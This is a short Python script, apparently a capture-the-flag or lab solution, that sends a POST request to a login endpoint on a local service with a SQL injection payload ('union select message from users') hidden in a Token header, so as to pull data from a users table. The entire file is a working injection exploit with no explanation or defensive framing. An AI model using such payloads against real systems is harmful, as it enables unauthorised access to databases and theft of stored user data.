import requests

target = "http://localhost:55502"

req = requests.post(target + "/login", headers={"Token": "' union select message from users limit 1; --"})

print(req.text)